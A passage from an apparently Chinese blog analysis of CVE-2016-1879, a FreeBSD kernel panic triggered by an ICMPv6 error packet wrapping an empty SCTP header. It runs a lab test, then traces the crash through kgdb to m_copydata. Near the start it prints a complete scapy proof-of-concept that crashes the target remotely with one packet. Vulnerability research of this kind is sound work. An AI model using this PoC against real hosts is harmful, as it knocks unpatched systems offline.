class="variable">&lt;PERFORMNUD,AUTO_LINKLOCAL&gt;</span></span><br></pre></td></tr></table></figure>
<p>​    在kali中执行poc。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  /tmp  ifconfig</span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">172.16</span><span class="number">.9</span><span class="number">.185</span>  netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  broadcast <span class="number">172.16</span><span class="number">.9</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::<span class="number">20</span>c:<span class="number">29f</span>f:fe80:<span class="number">3f</span>b7  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">80</span>:<span class="number">3f</span>:b7  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">1011</span>  bytes <span class="number">169118</span> (<span class="number">165.1</span> KiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">94</span>  bytes <span class="number">15401</span> (<span class="number">15.0</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0x10</span>&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">0</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">50</span>  bytes <span class="number">2980</span> (<span class="number">2.9</span> KiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">50</span>  bytes <span class="number">2980</span> (<span class="number">2.9</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">➜  /tmp  python poc.py -m <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:f8:<span class="number">4</span>d:dd -i fe80::<span class="number">20</span>c:<span class="number">29f</span>f:fef8:<span class="number">4</span>ddd -I eth0</span><br><span class="line">WARNING: No route found <span class="keyword">for</span> IPv6 destination :: (no <span class="keyword">default</span> route?)</span><br><span class="line">.</span><br><span class="line">Sent <span class="number">1</span> packets.</span><br></pre></td></tr></table></figure>
<p>​    执行完之后就会发现freebsd的虚拟机自动重启了。重启完成之后查看可以看到已经产生了dump。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@:~ <span class="preprocessor"># ll /var/crash/</span></span><br><span class="line">total <span class="number">215408</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> root  wheel         <span class="number">2</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> bounds</span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel     <span class="number">75526</span> Feb  <span class="number">9</span> <span class="number">07</span>:<span class="number">49</span> core.txt<span class="number">.0</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel     <span class="number">75224</span> Feb  <span class="number">9</span> <span class="number">09</span>:<span class="number">44</span> core.txt<span class="number">.1</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel     <span class="number">90281</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">06</span> core.txt<span class="number">.2</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel    <span class="number">100905</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> core.txt<span class="number">.3</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel       <span class="number">439</span> Feb  <span class="number">9</span> <span class="number">07</span>:<span class="number">49</span> info<span class="number">.0</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel       <span class="number">408</span> Feb  <span class="number">9</span> <span class="number">09</span>:<span class="number">44</span> info<span class="number">.1</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel       <span class="number">407</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">06</span> info<span class="number">.2</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel       <span class="number">408</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> info<span class="number">.3</span></span><br><span class="line">lrwxr-xr-x  <span class="number">1</span> root  wheel         <span class="number">6</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> info.last@ -&gt; info<span class="number">.3</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> root  wheel         <span class="number">5</span> Nov <span class="number">11</span>  <span class="number">2014</span> minfree</span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel  <span class="number">64851968</span> Feb  <span class="number">9</span> <span class="number">07</span>:<span class="number">49</span> vmcore<span class="number">.0</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel  <span class="number">66797568</span> Feb  <span class="number">9</span> <span class="number">09</span>:<span class="number">44</span> vmcore<span class="number">.1</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel  <span class="number">78901248</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">06</span> vmcore<span class="number">.2</span></span><br><span class="line">-rw-------  <span class="number">1</span> root  wheel  <span class="number">65212416</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> vmcore<span class="number">.3</span></span><br><span class="line">lrwxr-xr-x  <span class="number">1</span> root  wheel         <span class="number">8</span> Feb  <span class="number">9</span> <span class="number">11</span>:<span class="number">08</span> vmcore.last@ -&gt; vmcore<span class="number">.3</span></span><br></pre></td></tr></table></figure>
<h1 id="0x03_攻击包分析">0x03 攻击包分析</h1><h2 id="3-1_分析poc">3.1 分析poc</h2><p>​    先看poc代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_args</span><span class="params">()</span>:</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'#'</span> * <span class="number">78</span>, epilog=<span class="string">'#'</span> * <span class="number">78</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-m"</span>, <span class="string">"--dst_mac"</span>, type=str, help=<span class="string">"FreeBSD mac address"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--dst_ipv6"</span>, type=str, help=<span class="string">"FreeBSD IPv6 address"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-I"</span>, <span class="string">"--iface"</span>, type=str, help=<span class="string">"Iface"</span>)</span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.dst_mac <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> options.dst_ipv6 <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> options</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    options = get_args()</span><br><span class="line"></span><br><span class="line">    sendp(</span><br><span class="line">Ether(dst=options.dst_mac) / </span><br><span class="line">IPv6(dst=options.dst_ipv6) / </span><br><span class="line">ICMPv6DestUnreach() / </span><br><span class="line">IPv6(nh=<span class="number">132</span>,                                                                              src=options.dst_ipv6,                                                                                              dst=<span class="string">'fe80::230:56ff:fea6:648c'</span>),</span><br><span class="line">iface=options.iface</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>​    从poc代码可以看出，我们只向目标机器发送一个网络包。</p>
<ul>
<li>ICMPv6DestUnreach()，所以发送的是一个icmp错误信息包。</li>
<li>IPV6（nh=132，…）,ICMPv6包的内容是一个nexthead为132的ipv6包。就是SCTP包。但是这个把包并没有任何SCTP协议的数据。</li>
</ul>
<h2 id="3-2_抓包分析">3.2 抓包分析</h2><p>​    通过wireshark抓取网络包。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE_2016_1879_packet.jpeg" alt="wireshark抓包"></p>
<p>​    确实和我们分析的一样。可以看到payload的length是0。</p>
<h1 id="0x04_分析VMCORE">0x04 分析VMCORE</h1><p>​    进入存放调试信息的文件夹。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@:~ <span class="preprocessor"># cd /usr/obj/usr/src/sys/GENERIC/</span></span><br><span class="line">root@:/usr/obj/usr/src/sys/GENERIC <span class="preprocessor"># ll | grep kernel</span></span><br><span class="line">-rwxr-xr-x  <span class="number">1</span> root  wheel  <span class="number">21156391</span> Feb  <span class="number">9</span> <span class="number">08</span>:<span class="number">41</span> kernel*</span><br><span class="line">-rwxr-xr-x  <span class="number">1</span> root  wheel  <span class="number">87800381</span> Feb  <span class="number">9</span> <span class="number">08</span>:<span class="number">41</span> kernel.debug*</span><br><span class="line">-rwxr-xr-x  <span class="number">1</span> root  wheel  <span class="number">70283677</span> Feb  <span class="number">9</span> <span class="number">08</span>:<span class="number">41</span> kernel.symbols*</span><br></pre></td></tr></table></figure>
<p>​    启动kgdb调试崩溃的VMCORE。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@:/usr/obj/usr/src/sys/GENERIC <span class="preprocessor"># kgdb kernel.debug /var/crash/vmcore<span class="number">.1</span> </span></span><br><span class="line">GNU gdb <span class="number">6.1</span><span class="number">.1</span> [FreeBSD]</span><br><span class="line">Copyright <span class="number">2004</span> Free Software Foundation, Inc.</span><br><span class="line">GDB is <span class="built_in">free</span> software, covered by the GNU General Public License, and you are</span><br><span class="line">welcome to change it and/or distribute copies of it under certain conditions.</span><br><span class="line">Type <span class="string">"show copying"</span> to see the conditions.</span><br><span class="line">There is absolutely no warranty <span class="keyword">for</span> GDB.  Type <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"amd64-marcel-freebsd"</span>...</span><br><span class="line"></span><br><span class="line">Unread portion of the kernel message buffer:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fatal trap <span class="number">12</span>: page fault <span class="keyword">while</span> in kernel mode</span><br><span class="line">cpuid = <span class="number">0</span>; apic id = <span class="number">00</span></span><br><span class="line">fault <span class="keyword">virtual</span> address	= <span class="number">0x18</span></span><br><span class="line">fault code		= supervisor read data, page not present</span><br><span class="line">instruction pointer	= <span class="number">0x20</span>:<span class="number">0xffffffff809959f0</span></span><br><span class="line"><span class="built_in">stack</span> pointer	        = <span class="number">0x28</span>:<span class="number">0xfffffe00003fd300</span></span><br><span class="line">frame pointer	        = <span class="number">0x28</span>:<span class="number">0xfffffe00003fd340</span></span><br><span class="line">code segment		= base <span class="number">0x0</span>, limit <span class="number">0xfffff</span>, type <span class="number">0x1b</span></span><br><span class="line">			= DPL <span class="number">0</span>, pres <span class="number">1</span>, <span class="keyword">long</span> <span class="number">1</span>, def32 <span class="number">0</span>, gran <span class="number">1</span></span><br><span class="line">processor eflags	= interrupt enabled, resume, IOPL = <span class="number">0</span></span><br><span class="line">current process		= <span class="number">0</span> (em0 taskq)</span><br><span class="line">trap number		= <span class="number">12</span></span><br><span class="line">panic: page fault</span><br><span class="line">cpuid = <span class="number">0</span></span><br><span class="line">KDB: <span class="built_in">stack</span> backtrace:</span><br><span class="line"><span class="preprocessor">#<span class="number">0</span> <span class="number">0xffffffff80963000</span> at kdb_backtrace+<span class="number">0x60</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">1</span> <span class="number">0xffffffff80928125</span> at panic+<span class="number">0x155</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">2</span> <span class="number">0xffffffff80d24f1f</span> at trap_fatal+<span class="number">0x38f</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">3</span> <span class="number">0xffffffff80d25238</span> at trap_pfault+<span class="number">0x308</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">4</span> <span class="number">0xffffffff80d2489a</span> at trap+<span class="number">0x47a</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">5</span> <span class="number">0xffffffff80d0a782</span> at calltrap+<span class="number">0x8</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">6</span> <span class="number">0xffffffff80b091ed</span> at sctp6_ctlinput+<span class="number">0xbd</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">7</span> <span class="number">0xffffffff80ade0a5</span> at icmp6_input+<span class="number">0x1bf5</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">8</span> <span class="number">0xffffffff80af2b0c</span> at ip6_input+<span class="number">0x5cc</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">9</span> <span class="number">0xffffffff809f44e2</span> at netisr_dispatch_src+<span class="number">0x62</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">10</span> <span class="number">0xffffffff809eb996</span> at ether_demux+<span class="number">0x126</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">11</span> <span class="number">0xffffffff809ec63e</span> at ether_nh_input+<span class="number">0x35e</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">12</span> <span class="number">0xffffffff809f44e2</span> at netisr_dispatch_src+<span class="number">0x62</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">13</span> <span class="number">0xffffffff804de3d9</span> at lem_rxeof+<span class="number">0x489</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">14</span> <span class="number">0xffffffff804ddbb1</span> at lem_handle_rxtx+<span class="number">0x31</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">15</span> <span class="number">0xffffffff80971475</span> at taskqueue_run_locked+<span class="number">0xe5</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">16</span> <span class="number">0xffffffff80971f08</span> at taskqueue_thread_loop+<span class="number">0xa8</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">17</span> <span class="number">0xffffffff808f8b6a</span> at fork_exit+<span class="number">0x9a</span></span></span><br><span class="line">Uptime: <span class="number">53</span>m18s</span><br><span class="line">Dumping <span class="number">63</span> out of <span class="number">232</span> MB:.<span class="number">.26</span>%.<span class="number">.51</span>%.<span class="number">.76</span>%</span><br><span class="line"></span><br><span class="line">Reading symbols from /boot/kernel/uhid.ko.symbols...done.</span><br><span class="line">Loaded symbols <span class="keyword">for</span> /boot/kernel/uhid.ko.symbols</span><br><span class="line"><span class="preprocessor">#<span class="number">0</span>  doadump (textdump=&lt;value optimized out&gt;) at pcpu.h:<span class="number">219</span></span></span><br><span class="line"><span class="number">219</span>		__asm(<span class="string">"movq %%gs:%1,%0"</span> : <span class="string">"=r"</span> (td)</span><br><span class="line">(kgdb)</span><br></pre></td></tr></table></figure>
<p>​    这个时候只需要键入bt就可以看到带有调试符的崩溃信息了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) bt</span><br><span class="line"><span class="preprocessor">#<span class="number">0</span>  doadump (textdump=&lt;value optimized out&gt;) at pcpu.h:<span class="number">219</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">1</span>  <span class="number">0xffffffff80927da2</span> in kern_reboot (howto=<span class="number">260</span>) at /usr/src/sys/kern/kern_shutdown.c:<span class="number">452</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">2</span>  <span class="number">0xffffffff80928164</span> in panic (fmt=&lt;value optimized out&gt;) at /usr/src/sys/kern/kern_shutdown.c:<span class="number">759</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">3</span>  <span class="number">0xffffffff80d24f1f</span> in trap_fatal (frame=&lt;value optimized out&gt;, eva=&lt;value optimized out&gt;) at /usr/src/sys/amd64/amd64/trap.c:<span class="number">865</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">4</span>  <span class="number">0xffffffff80d25238</span> in trap_pfault (frame=<span class="number">0xfffffe00003fd250</span>, usermode=&lt;value optimized out&gt;) at /usr/src/sys/amd64/amd64/trap.c:<span class="number">676</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">5</span>  <span class="number">0xffffffff80d2489a</span> in trap (frame=<span class="number">0xfffffe00003fd250</span>) at /usr/src/sys/amd64/amd64/trap.c:<span class="number">440</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">6</span>  <span class="number">0xffffffff80d0a782</span> in calltrap () at /usr/src/sys/amd64/amd64/exception.S:<span class="number">232</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">7</span>  <span class="number">0xffffffff809959f0</span> in m_copydata (m=&lt;value optimized out&gt;, off=&lt;value optimized out&gt;, len=&lt;value optimized out&gt;, cp=&lt;value optimized out&gt;) at /usr/src/sys/kern/uipc_mbuf.c:<span class="number">884</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">8</span>  <span class="number">0xffffffff80b091ed</span> in sctp6_ctlinput (cmd=<span class="number">8</span>, pktdst=<span class="number">0xfffffe00003fd4f0</span>, d=<span class="number">0xfffffe00003fd4a8</span>) at /usr/src/sys/netinet6/sctp6_usrreq.c:<span class="number">409</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">9</span>  <span class="number">0xffffffff80ade0a5</span> in icmp6_input (mp=&lt;value optimized out&gt;, offp=&lt;value optimized out&gt;, proto=&lt;value optimized out&gt;) at /usr/src/sys/netinet6/icmp6.c:<span class="number">1176</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">10</span> <span class="number">0xffffffff80af2b0c</span> in ip6_input (m=<span class="number">0xfffff80002a61d00</span>) at /usr/src/sys/netinet6/ip6_input.c:<span class="number">1019</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">11</span> <span class="number">0xffffffff809f44e2</span> in netisr_dispatch_src (proto=&lt;value optimized out&gt;, source=&lt;value optimized out&gt;, m=<span class="number">0x0</span>) at /usr/src/sys/net/netisr.c:<span class="number">972</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">12</span> <span class="number">0xffffffff809eb996</span> in ether_demux (ifp=&lt;value optimized out&gt;, m=<span class="number">0xfffff80002a61d00</span>) at /usr/src/sys/net/if_ethersubr.c:<span class="number">851</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">13</span> <span class="number">0xffffffff809ec63e</span> in ether_nh_input (m=&lt;value optimized out&gt;) at /usr/src/sys/net/if_ethersubr.c:<span class="number">646</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">14</span> <span class="number">0xffffffff809f44e2</span> in netisr_dispatch_src (proto=&lt;value optimized out&gt;, source=&lt;value optimized out&gt;, m=<span class="number">0x0</span>) at /usr/src/sys/net/netisr.c:<span class="number">972</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">15</span> <span class="number">0xffffffff804de3d9</span> in lem_rxeof (count=&lt;value optimized out&gt;) at /usr/src/sys/dev/e1000/if_lem.c:<span class="number">3824</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">16</span> <span class="number">0xffffffff804ddbb1</span> in lem_handle_rxtx (context=<span class="number">0xfffffe00007df000</span>, pending=&lt;value optimized out&gt;) at /usr/src/sys/dev/e1000/if_lem.c:<span class="number">1440</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">17</span> <span class="number">0xffffffff80971475</span> in taskqueue_run_locked (queue=<span class="number">0xfffff800023f0300</span>) at /usr/src/sys/kern/subr_taskqueue.c:<span class="number">342</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">18</span> <span class="number">0xffffffff80971f08</span> in taskqueue_thread_loop (arg=&lt;value optimized out&gt;) at /usr/src/sys/kern/subr_taskqueue.c:<span class="number">563</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">19</span> <span class="number">0xffffffff808f8b6a</span> in fork_exit (callout=<span class="number">0xffffffff80971e60</span> &lt;taskqueue_thread_loop&gt;, arg=<span class="number">0xfffffe00007e1830</span>, frame=<span class="number">0xfffffe00003fdac0</span>) at /usr/src/sys/kern/kern_fork.c:<span class="number">996</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">20</span> <span class="number">0xffffffff80d0acbe</span> in fork_trampoline () at /usr/src/sys/amd64/amd64/exception.S:<span class="number">606</span></span></span><br><span class="line"><span class="preprocessor">#<span class="number">21</span> <span class="number">0x0000000000000000</span> in ?? ()</span></span><br><span class="line">Current language:  <span class="keyword">auto</span>; <span class="function">currently <span class="title">minimal</span></span><br><span class="line"><span class="params">(kgdb)</span></span></span><br></pre></td></tr></table></figure>
<p>​    可以看到0~6都已经是系统的异常处理了。所以我们直接看#7栈。</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) f <span class="number">7</span></span><br><span class="line"><span class="number">#7</span>  <span class="number">0</span>xffffffff<span class="number">809959f</span><span class="number">0</span> <span class="keyword">in</span> m<span class="number">_</span>copydata (m=&lt;<span class="keyword">value</span> optimized <span class="keyword">out</span>&gt;, off=&lt;<span class="keyword">value</span> optimized <span class="keyword">out</span>&gt;, len=&lt;<span class="keyword">value</span> optimized <span class="keyword">out</span>&gt;, cp=&lt;<span class="keyword">value</span> optimized <span class="keyword">out</span>&gt;) at /usr/src/sys/kern/uipc<span class="number">_m</span>buf.c:<span class="number">884</span></span><br><span class="line"><span class="number">884</span>		<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br></pre></td></tr></table></figure>
<p>​    打开源码/usr/src/sys/kern/uipc_mbuf.c看m_copydata函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * Copy data from an mbuf chain starting "off" bytes from the beginning,</span><br><span class="line"> * continuing for "len" bytes, into the indicated buffer.</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span><br><span class="line"><span class="title">m_copydata</span><span class="params">(<span class="keyword">const</span> <span class="keyword">struct</span> mbuf *m, <span class="keyword">int</span> off, <span class="keyword">int</span> len, caddr_t cp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	u_int count;</span><br><span class="line"></span><br><span class="line">	KASSERT(off &gt;= <span class="number">0</span>, (<span class="string">"m_copydata, negative off %d"</span>, off));</span><br><span class="line">	KASSERT(len &gt;= <span class="number">0</span>, (<span class="string">"m_copydata, negative len %d"</span>, len));</span><br><span class="line">	<span class="keyword">while</span> (off &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		KASSERT(m != <span class="literal">NULL</span>, (<span class="string">"m_copydata, offset &gt; size of mbuf chain"</span>));<span class="comment">//第一个m的assert</span></span><br><span class="line">		<span class="keyword">if</span> (off &lt; m-&gt;m_len)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		off -= m-&gt;m_len;</span><br><span class="line">		m = m-&gt;m_next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;	<span class="comment">//884行</span></span><br><span class="line">		KASSERT(m != <span class="literal">NULL</span>, (<span class="string">"m_copydata, length &gt; size of mbuf chain"</span>)); <span class="comment">//885行</span></span><br><span class="line">      	<span class="comment">//这里以下不重要</span></span><br><span class="line">      	<span class="comment">//这里以下不重要</span></span><br><span class="line">		count = min(m-&gt;m_len - off, len);</span><br><span class="line">		bcopy(mtod(m, <span class="keyword">caddr_t</span>) + off, cp, count);</span><br><span class="line">		len -= count;</span><br><span class="line">		cp += count;</span><br><span class="line">		off = <span class="number">0</span>;</span><br><span class="line">		m = m-&gt;m_next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    明显可以看出来是被assert掉了。说明m是一个NULL。但是上面的assert并没有触发。根据代码上下文判断<strong>只有</strong>一个可能。那就是m = m-&gt;next的时候m被赋值成了NULL。说明m-&gt;next是一个NULL。</p>
<p>​    根据线索只能分析出这么多，那么再看上一级调用。看看到底传进来的参数是什么。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) f <span class="number">8</span></span><br><span class="line"><span class="preprocessor">#<span class="number">8</span>  <span class="number">0xffffffff80b091ed</span> in sctp6_ctlinput (cmd=<span class="number">8</span>, pktdst=<span class="number">0xfffffe00003fd4f0</span>, d=<span class="number">0xfffffe00003fd4a8</span>) at /usr/src/sys/netinet6/sctp6_usrreq.c:<span class="number">409</span></span></span><br><span class="line"><span class="number">409</span>			m_copydata(ip6cp-&gt;ip6c_m, ip6cp-&gt;ip6c_off, <span class="keyword">sizeof</span>(sh),</span><br></pre></td></tr></table></figure>
<p>​    那么我们需要知道ip6cp的数据。根据源码/usr/src/sys/netinet6/sctp6_usrreq.c</p>
